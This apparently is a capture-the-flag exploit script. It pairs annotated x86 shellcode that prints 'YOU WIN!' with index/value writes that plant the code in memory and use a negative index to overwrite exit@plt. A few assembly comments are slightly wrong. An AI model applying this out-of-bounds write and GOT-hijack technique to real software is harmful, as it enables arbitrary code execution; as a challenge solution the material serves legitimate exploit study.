"""
\x31\xc0                xor %eax,$eax
\x50                    push %eax
\x68\x57\x49\x4e\x21    push $0x214e4957 ; YOU WIN!
\x68\x59\x4f\x55\x20    push $0x2055f459 ; YOU WIN!
\xb3\x01                mov $0x1,%ebx    ; stdout
\x89\xe1                mov %esp,%ecx    ; Address of "YOU WIN!"
\xb2\x08                mov $0x8,%dl     ; Length of "YOU WIN!"
\xb0\x04                mov $0x4,%al     ; Write
\xcd\x80                int $0x80        ; Syscall
"""

print("0\n1750122545")  # 0x6850c031
print("1\n558778711")   # 0x214e4957
print("2\n1431263592")  # 0x554f5968
print("3\n113440")      # 0x0001bb20
print("4\n-511115264")  # 0xe1890000
print("5\n78645426")    # 0x04b008b2
print("6\n771784909")   # 0x2e0080cd
print("7\n1953331571")  # 0x746d7973
print("8\n771777121")   # 0x2e006261
print("-14\n134520896") # Modify exit@plt
print("1024\n1024")     # End
